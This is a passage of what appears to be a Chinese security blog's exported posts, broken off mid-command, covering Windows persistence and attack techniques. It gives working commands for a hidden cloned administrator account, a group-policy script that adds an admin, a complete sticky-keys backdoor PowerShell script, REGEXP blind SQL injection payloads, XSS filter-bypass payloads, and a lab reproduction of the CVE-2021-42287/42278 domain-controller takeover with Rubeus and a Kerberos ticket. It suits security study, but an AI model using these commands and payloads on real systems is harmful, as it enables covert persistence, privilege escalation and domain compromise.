<p><a href="https://github.com/Yihsiwei/GetOut360">https://github.com/Yihsiwei/GetOut360</a></p>
<br>

<h4 id="å½±å­ç”¨æˆ·"><a href="#å½±å­ç”¨æˆ·" class="headerlink" title="å½±å­ç”¨æˆ·"></a>å½±å­ç”¨æˆ·</h4><h5 id="1-åˆ›å»ºéšè—è´¦æˆ·"><a href="#1-åˆ›å»ºéšè—è´¦æˆ·" class="headerlink" title="1.åˆ›å»ºéšè—è´¦æˆ·"></a>1.åˆ›å»ºéšè—è´¦æˆ·</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#åˆ›å»ºå®Œæˆåä»å¯ä»¥é€šè¿‡è®¡ç®—æœºç®¡ç†å’Œç™»å½•å¤„çœ‹åˆ°è¯¥ç”¨æˆ·</span><br><span class="line">net user test$ Test.123 &#x2F;add</span><br><span class="line">net localgroup administrators test$ &#x2F;add</span><br></pre></td></tr></table></figure>

<h5 id="2-æ‰“å¼€æ³¨å†Œè¡¨-regedit-ä¿®æ”¹æƒé™"><a href="#2-æ‰“å¼€æ³¨å†Œè¡¨-regedit-ä¿®æ”¹æƒé™" class="headerlink" title="2.æ‰“å¼€æ³¨å†Œè¡¨ regedit ä¿®æ”¹æƒé™"></a>2.æ‰“å¼€æ³¨å†Œè¡¨ regedit ä¿®æ”¹æƒé™</h5><p><code>HKEY_LOCAL_MACHINE\SAM\SAM</code> çš„adminstratoræƒé™ä¿®æ”¹ä¸ºå®Œå…¨æ§åˆ¶å’Œè¯»å–ï¼Œç„¶åé‡æ–°æ‰“å¼€æ³¨å†Œè¡¨ä¾¿å¯ç»§ç»­æŸ¥çœ‹å†…å®¹</p>
<h5 id="3-å¯¼å‡ºtest-è´¦æˆ·çš„reg-å’Œ-å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨"><a href="#3-å¯¼å‡ºtest-è´¦æˆ·çš„reg-å’Œ-å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨" class="headerlink" title="3.å¯¼å‡ºtest$è´¦æˆ·çš„reg å’Œ å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨"></a>3.å¯¼å‡ºtest$è´¦æˆ·çš„reg å’Œ å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨</h5><p>è·¯å¾„ä¸º<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></p>
<h5 id="4-å°†test-å¯¹åº”çš„00000XXX-regçš„-Få€¼æ›¿æ¢ä¸ºadministrator-å¯¹åº”00000XXX-regçš„Få€¼"><a href="#4-å°†test-å¯¹åº”çš„00000XXX-regçš„-Få€¼æ›¿æ¢ä¸ºadministrator-å¯¹åº”00000XXX-regçš„Få€¼" class="headerlink" title="4.å°†test$å¯¹åº”çš„00000XXX.regçš„ Få€¼æ›¿æ¢ä¸ºadministrator å¯¹åº”00000XXX.regçš„Få€¼"></a>4.å°†test$å¯¹åº”çš„00000XXX.regçš„ Få€¼æ›¿æ¢ä¸ºadministrator å¯¹åº”00000XXX.regçš„Få€¼</h5><h5 id="5-åˆ é™¤test-ç”¨æˆ·"><a href="#5-åˆ é™¤test-ç”¨æˆ·" class="headerlink" title="5.åˆ é™¤test$ç”¨æˆ·"></a>5.åˆ é™¤test$ç”¨æˆ·</h5><p><code>net user test$ /del</code>  ï¼ˆåˆ é™¤åæ³¨å†Œè¡¨é‡Œçš„test$ç”¨æˆ·å°±æ— æ³•æ‰“å¼€äº†ï¼‰</p>
<h5 id="6-åœ¨cmdå¯¼å…¥test-çš„ä¸¤ä¸ªæ³¨å†Œè¡¨"><a href="#6-åœ¨cmdå¯¼å…¥test-çš„ä¸¤ä¸ªæ³¨å†Œè¡¨" class="headerlink" title="6.åœ¨cmdå¯¼å…¥test$çš„ä¸¤ä¸ªæ³¨å†Œè¡¨"></a>6.åœ¨cmdå¯¼å…¥test$çš„ä¸¤ä¸ªæ³¨å†Œè¡¨</h5><p>(è¿™æ ·å°±ä¸ä¼šåœ¨è®¡ç®—æœºç®¡ç†å’Œç™»å½•é¡µé¢çœ‹åˆ°åˆ›å»ºçš„è´¦æˆ·äº†ï¼Œä½†ä»å¯ä»¥åœ¨ç»„æˆä¸SAMä¸‹çœ‹åˆ°,ç™»å½•åä¼šåœ¨è®¡ç®—æœºç®¡ç†ä¸­æ˜¾ç¤ºè¯¥ç”¨æˆ·ï¼Œæƒ³è¦æ¸…é™¤è¯¥ç”¨æˆ·éœ€è¦åœ¨æ³¨å†Œè¡¨æ¸…é™¤)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regedit  &#x2F;s 1.reg</span><br><span class="line">regedit  &#x2F;s 2.reg</span><br></pre></td></tr></table></figure>

<h5 id="7-ä½¿ç”¨3389ç™»å½•-ä¼š-ç™»é™†åˆ°administrator-çš„å½“å‰çŠ¶æ€ä¸‹-å®ç°adminstratorè´¦æˆ·çš„å…‹éš†"><a href="#7-ä½¿ç”¨3389ç™»å½•-ä¼š-ç™»é™†åˆ°administrator-çš„å½“å‰çŠ¶æ€ä¸‹-å®ç°adminstratorè´¦æˆ·çš„å…‹éš†" class="headerlink" title="7.ä½¿ç”¨3389ç™»å½• ä¼š ç™»é™†åˆ°administrator çš„å½“å‰çŠ¶æ€ä¸‹ å®ç°adminstratorè´¦æˆ·çš„å…‹éš†"></a>7.ä½¿ç”¨3389ç™»å½• ä¼š ç™»é™†åˆ°administrator çš„å½“å‰çŠ¶æ€ä¸‹ å®ç°adminstratorè´¦æˆ·çš„å…‹éš†</h5><br>

<h4 id="ç»„ç­–ç•¥"><a href="#ç»„ç­–ç•¥" class="headerlink" title="ç»„ç­–ç•¥"></a>ç»„ç­–ç•¥</h4><p>win+R    gpedit.msc æ‰“å¼€æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨<br>é€‰æ‹©è®¡ç®—æœºç®¡ç†-&gt;WIndowsè®¾ç½®-&gt;è„šæœ¬(å¯åŠ¨/å…³é—­)  é€‰æ‹©å¯åŠ¨æˆ–å…³é—­ æ·»åŠ batè„šæœ¬</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">net user test<span class="variable">$</span> Test.<span class="number">123</span> /add</span><br><span class="line">net localgroup administrators test<span class="variable">$</span> /add</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="ç²˜æ»é”®åé—¨"><a href="#ç²˜æ»é”®åé—¨" class="headerlink" title="ç²˜æ»é”®åé—¨"></a>ç²˜æ»é”®åé—¨</h4><h5 id="Shiftkey"><a href="#Shiftkey" class="headerlink" title="Shiftkey"></a>Shiftkey</h5><p><code>Set-ExecutionPolicy Unrestricted</code></p>
<p><code>Import-Module .\shiftkey.ps1</code></p>
<p>è¿è¡Œä¸€æ¬¡ä¼šå¯åŠ¨ å†æ¬¡è¿è¡Œä¼šåˆ é™¤<br>åœ¨ç”¨æˆ·ç™»å½•ä¸‹ä¸ºå½“å‰ç”¨æˆ·æƒé™ï¼Œåœ¨ç™»å½•ç•Œé¢ä¸ºsystemæƒé™</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$registryPath</span> = <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&quot;</span> </span><br><span class="line"><span class="variable">$keyName</span> = <span class="string">&quot;sethc.exe&quot;</span> </span><br><span class="line"><span class="variable">$stringName</span> = <span class="string">&quot;Debugger&quot;</span> </span><br><span class="line"><span class="variable">$binaryValue</span> = <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"><span class="keyword">IF</span> (<span class="built_in">Test-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>)) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment"># Sticky Keys backdoor exists.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key found. Let&#x27;s remove it.&quot;</span>    </span><br><span class="line">     <span class="comment">#New-Item -Path $registryPath -Name $keyName | Out-Null    </span></span><br><span class="line">     <span class="built_in">Remove-Item</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Key backdoor has been removed.&quot;</span>    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ELSE</span> </span><br><span class="line">&#123;    </span><br><span class="line">     <span class="comment"># Sticky Keys backdoor does not exist, let&#x27;s add it.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key not found. Attempting to add Sticky Keys backdoor to registry.&quot;</span>    </span><br><span class="line">     <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$registryPath</span> <span class="literal">-Name</span> <span class="variable">$keyName</span> | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) <span class="literal">-Name</span> <span class="variable">$stringName</span> <span class="literal">-Value</span> <span class="variable">$binaryValue</span> | <span class="built_in">Out-Null</span>     </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Keys backdoor added.&quot;</span>     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="åŠ«æŒåé—¨"><a href="#åŠ«æŒåé—¨" class="headerlink" title="åŠ«æŒåé—¨"></a>åŠ«æŒåé—¨</h4><br>

<h4 id="æ³¨å†Œè¡¨"><a href="#æ³¨å†Œè¡¨" class="headerlink" title="æ³¨å†Œè¡¨"></a>æ³¨å†Œè¡¨</h4><br>

<h4 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h4><br>

<h4 id="æ–°æœåŠ¡"><a href="#æ–°æœåŠ¡" class="headerlink" title="æ–°æœåŠ¡"></a>æ–°æœåŠ¡</h4><br>

<h4 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h4>]]></content>
      <categories>
        <category>æƒé™ç»´æŒ</category>
      </categories>
      <tags>
        <tag>æƒé™ç»´æŒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Regexpæ³¨å…¥</title>
    <url>/posts/6cc02bf9/</url>
    <content><![CDATA[<p>ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é… ç”¨äºç›²æ³¨ä¸­</p>
<br>

<p>regexp â€˜^[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) </code>    # åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯ a-z</p>
<br>

<p>regexp â€˜^eâ€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºe</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </code> # åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯ e</p>
<br>

<p>regexp â€˜^e[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e[a-z]&#39; LIMIT 0,1)</code></p>
]]></content>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ”¶é›†å¯èƒ½ä¼šç”¨åˆ°çš„ç«™ç‚¹</title>
    <url>/posts/4259031d/</url>
    <content><![CDATA[<p>å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ ç½‘å€ï¼š<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a><br>é¦™æ¸¯æŸ¥å†Œä¸­å¿ƒç½‘å€ï¼š<a href="https://www.icris.cr.gov.hk/csci/">https://www.icris.cr.gov.hk/csci/</a><br>å°æ¹¾å•†å·¥è¡Œæ”¿åŠ¡æœåŠ¡å…¥å£ç½‘<a href="https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do">https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do</a><br>è‹±å›½å·¥å•†ä¿¡æ¯<a href="https://www.gov.uk/government/organisations/companies-house">https://www.gov.uk/government/organisations/companies-house</a><br>ç¾å›½å·¥å•†ä¿¡æ¯ç½‘å€ï¼š<a href="http://www.wysk.com/index/">http://www.wysk.com/index/</a><br>æ–°åŠ å¡å·¥å•†ä¿¡æ¯ç½‘ç«™ï¼š<a href="https://www.acra.gov.sg/home/">https://www.acra.gov.sg/home/</a><br>æ¾³å¤§åˆ©äºšå·¥å•†ä¿¡æ¯ç½‘å€ï¼š<a href="http://abr.business.gov.au/">http://abr.business.gov.au</a><br>å°åº¦å·¥å•†ä¿¡æ¯ ç½‘å€ï¼š<a href="http://www.mca.gov.in/">http://www.mca.gov.in</a><br>ç¬¬ä¸‰æ–¹ä¼ä¸šæŸ¥è¯¢ç½‘ç«™  ç½‘å€ï¼š<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>ä¼æŸ¥æŸ¥ ç½‘å€ï¼š<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>çˆ±ä¼æŸ¥ ç½‘å€ï¼š<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>å¯ä¿¡å®  ç½‘å€ï¼š<a href="https://www.qixin.com/">https://www.qixin.com/</a><br>Opencorporates ç½‘å€ï¼š<a href="https://opencorporates.com/">https://opencorporates.com/</a> å¯æŸ¥è¯¢å…¨çƒå…¬å¸åŸºæœ¬å·¥å•†ä¿¡æ¯ã€‚<br>Google  <a href="https://www.google.co.jp/">https://www.google.co.jp/</a><br>ç™¾åº¦ ç½‘å€ï¼š<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
]]></content>
      <categories>
        <category>ä¿¡æ¯æ”¶é›†</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡XXSç»•è¿‡å­¦ä¹ </title>
    <url>/posts/b6714d8e/</url>
    <content><![CDATA[<p>å‚è€ƒåŸæ–‡ <a href="https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA">https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA</a></p>
<h3 id="alertç»•è¿‡"><a href="#alertç»•è¿‡" class="headerlink" title="alertç»•è¿‡"></a>alertç»•è¿‡</h3><p>alert(1)   â€” &gt;    a=alert;a(1) </p>
<br>

<h3 id="äº‹ä»¶æ‹¦æˆªç»•è¿‡"><a href="#äº‹ä»¶æ‹¦æˆªç»•è¿‡" class="headerlink" title="äº‹ä»¶æ‹¦æˆªç»•è¿‡"></a>äº‹ä»¶æ‹¦æˆªç»•è¿‡</h3><p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;alert(1)&quot; /&gt; </code></p>
<p>oninvalidäº‹ä»¶ä¼šä»¥æ­£åˆ™è¡¨è¾¾å¼å»åˆ¤æ–­patternçš„å€¼ï¼Œå¦‚æœè¾“å…¥æ¡†å†…çš„å€¼ä¸å…¨ç­‰ä½™â€œaâ€ </p>
<p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;a=alert;a(1)&quot; /&gt;</code></p>
<br>

<h3 id="disableå±æ€§ç»•è¿‡"><a href="#disableå±æ€§ç»•è¿‡" class="headerlink" title="disableå±æ€§ç»•è¿‡"></a>disableå±æ€§ç»•è¿‡</h3><p>disable=â€disableâ€  â€”&gt; a=â€disable=â€disableâ€</p>
<br>

<br>

<br>

<p>xss æ’å…¥çš„ type å³æ˜¯ text åˆæ˜¯ submitï¼Œåœ¨æ–‡æœ¬æ¡†ä¸­æŒ‰å›è½¦å³å¯è§¦å‘</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278å¤ç°</title>
    <url>/posts/1fd95242/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>CVE-2021-42278ï¼Œæœºå™¨è´¦æˆ·çš„åå­—ä¸€èˆ¬æ¥è¯´åº”è¯¥ä»¥$ç»“å°¾ï¼Œä½†ADæ²¡æœ‰å¯¹åŸŸå†…æœºå™¨è´¦æˆ·ååšéªŒè¯ã€‚</p>
<p>CVE-2021-42287ï¼Œä¸ä¸Šè¿°æ¼æ´é…åˆä½¿ç”¨ï¼Œåˆ›å»ºä¸DCæœºå™¨è´¦æˆ·åå­—ç›¸åŒçš„æœºå™¨è´¦æˆ·ï¼ˆä¸ä»¥$ç»“å°¾ï¼‰ï¼Œè´¦æˆ·è¯·æ±‚ä¸€ä¸ªTGTåï¼Œæ›´åè´¦æˆ·ï¼Œç„¶åé€šè¿‡S4U2selfç”³è¯·TGS Ticketï¼Œæ¥ç€DCåœ¨TGS_REPé˜¶æ®µï¼Œè¿™ä¸ªè´¦æˆ·ä¸å­˜åœ¨çš„æ—¶å€™ï¼ŒDCä¼šä½¿ç”¨è‡ªå·±çš„å¯†é’¥åŠ å¯†TGS Ticketï¼Œæä¾›ä¸€ä¸ªå±äºè¯¥è´¦æˆ·çš„PACï¼Œç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªé«˜æƒé™STã€‚</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a> </p>
<p><a href="https://www.cnblogs.com/mrhonest/p/15682858.html">https://www.cnblogs.com/mrhonest/p/15682858.html</a></p>
<p><a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>åŸŸå†…æ™®é€šç”¨æˆ·</p>
<p><code>lab\user01 </code>  / <code>Test.123</code></p>
<p>Win2008</p>
<p>Win2012</p>
<h3 id="å¤ç°è¸©å‘"><a href="#å¤ç°è¸©å‘" class="headerlink" title="å¤ç°è¸©å‘"></a><em>å¤ç°</em>è¸©å‘</h3><h4 id="åˆ›å»ºåŸŸç”¨æˆ·hello"><a href="#åˆ›å»ºåŸŸç”¨æˆ·hello" class="headerlink" title="åˆ›å»ºåŸŸç”¨æˆ·hello"></a>åˆ›å»ºåŸŸç”¨æˆ·hello</h4><p>è¿™é‡Œä½¿ç”¨ä¸€ä¸ªåŸŸå†…æ™®é€šç”¨æˆ·è¿›è¡Œç™»å½•  ä¸‹è½½Powermad.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/1.png" alt="æˆªå›¾"></p>
<p><img src="/posts/1fd95242/2.png" alt="æˆªå›¾"></p>
<p>æˆåŠŸåˆ›å»ºç”¨æˆ·test</p>
<h4 id="åˆ é™¤spnè®°å½•"><a href="#åˆ é™¤spnè®°å½•" class="headerlink" title="åˆ é™¤spnè®°å½•"></a>åˆ é™¤spnè®°å½•</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN&#x3D;hello,CN&#x3D;Computers,DC&#x3D;lab,DC&#x3D;com&quot;  -Clear &#39;serviceprincipalname&#39; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆç”¨<code>setspn</code>æŸ¥ä¸€ä¸‹ </p>
<p><code>setspn -Q */* | findstr hola</code></p>
<p><img src="/posts/1fd95242/3.png" alt="æˆªå›¾"></p>
<br>

<p>è¿™é‡Œ æˆ‘å¦èµ·äº†ä¸€ä¸ªpowershellå»å¼•ç”¨æ¡Œé¢ä¸Šçš„cmd ç»“æœä¼šæŠ¥é”™ ï¼Œç„¶åæŠŠpowerviewæ”¾åœ¨PowermadåŒç›®å½•ä¸‹å¯¼å…¥å°±ä¸æŠ¥é”™äº†â€¦. ï¼ˆä¸çŸ¥é“ä¸ºå•¥â€¦ï¼‰</p>
<p><img src="/posts/1fd95242/4.png" alt="æˆªå›¾"></p>
<p>ç§»åŠ¨åå°±æ­£å¸¸äº†</p>
<p><img src="/posts/1fd95242/5.png" alt="æˆªå›¾"></p>
<p>(<del>åœ¨win2012powershellä¸‹ Set-DomainObjectæ²¡æœ‰è¿™ä¸ªä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼)â€¦</del></p>
<p>å‘ç°ä¸¤ä¸ªpowerview.ps1 å¤§å°ä¸ä¸€æ · ä¸æ˜¯åŒä¸€ä¸ª æœäº†â€¦â€¦ ä¸€ä¸ª700+K ä¸€ä¸ª300+K</p>
<p>ç„¶åå»å°è¯•åˆ é™¤spn ã€‚ã€‚ã€‚</p>
<p><img src="/posts/1fd95242/6.png" alt="æˆªå›¾"></p>
<br>

<h4 id="é‡è®¾æœºå™¨å"><a href="#é‡è®¾æœºå™¨å" class="headerlink" title="é‡è®¾æœºå™¨å"></a>é‡è®¾æœºå™¨å</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸ºåŸŸæ§å</p>
<p><img src="/posts/1fd95242/7.png" alt="æˆªå›¾"></p>
<h4 id="è¯·æ±‚TGT"><a href="#è¯·æ±‚TGT" class="headerlink" title="è¯·æ±‚TGT"></a>è¯·æ±‚TGT</h4><p><del>win2008ä¸‹ä½¿ç”¨Rubeus.exeæŠ¥é”™â€¦â€¦.$#%@&amp;@!#@!â€¦â€¦.</del></p>
<p><del>å»githubä¸Šä¸‹è½½ä¸‹æ¥ç¼–è¯‘ä¸€ä¸‹ ç„¶ååœ¨win2008ä¸Šè¿è¡Œ è¯´ç¼ºå°‘.net4.0 ç„¶åå»ä¸‹è½½ä¸‹æ¥å®‰è£…ï¼Œç»“æœå®‰è£…è¶…æ—¶äº†ï¼Œè¿™å°æœºå™¨çš„ç½‘ç»œâ€¦</del></p>
<p>åé¢æ‰¾äº†ä¸ª .net4.5å…å®‰è£…ç‰ˆå°±å¯ç”¨å»ä½¿ç”¨Rebuesã€‚ã€‚ã€‚ã€‚</p>
<br>

<h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><h4 id="åˆ›å»ºæœºå™¨ç”¨æˆ·hello"><a href="#åˆ›å»ºæœºå™¨ç”¨æˆ·hello" class="headerlink" title="åˆ›å»ºæœºå™¨ç”¨æˆ·hello"></a>åˆ›å»ºæœºå™¨ç”¨æˆ·hello</h4><h4 id="åˆ é™¤spnè®°å½•-1"><a href="#åˆ é™¤spnè®°å½•-1" class="headerlink" title="åˆ é™¤spnè®°å½•"></a>åˆ é™¤spnè®°å½•</h4><p><img src="/posts/1fd95242/8.png" alt="æˆªå›¾"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="é‡æ–°è®¾ç½®æœºå™¨å"><a href="#é‡æ–°è®¾ç½®æœºå™¨å" class="headerlink" title="é‡æ–°è®¾ç½®æœºå™¨å"></a>é‡æ–°è®¾ç½®æœºå™¨å</h4><p><img src="/posts/1fd95242/9.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è¯·æ±‚TGT-1"><a href="#è¯·æ±‚TGT-1" class="headerlink" title="è¯·æ±‚TGT"></a>è¯·æ±‚TGT</h4><p><img src="/posts/1fd95242/10.png" alt="æˆªå›¾"></p>
<br>

<h4 id="æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§"><a href="#æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§" class="headerlink" title="æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§"></a>æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§</h4><p><img src="/posts/1fd95242/11.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è·å–ç¥¨æ®"><a href="#è·å–ç¥¨æ®" class="headerlink" title="è·å–ç¥¨æ®"></a>è·å–ç¥¨æ®</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;nowrap &#x2F;dc:DC01.lab.com &#x2F;self &#x2F;altservice:LDAP&#x2F;DC01.lab.com  &#x2F;ptt &#x2F;ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN&#x2F;EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv&#x2F;iZtG3rvGdHafJxyD3b&#x2F;GfWSVLt3c1Ev7LGf9mUP&#x2F;tDzsxQ46mDgdbUiuB5B7&#x2F;z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa&#x2F;wqAkIl9cmO7d&#x2F;hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG&#x2F;W&#x2F;+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM&#x2F;1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J&#x2F;EKchSS0yIc</span><br><span 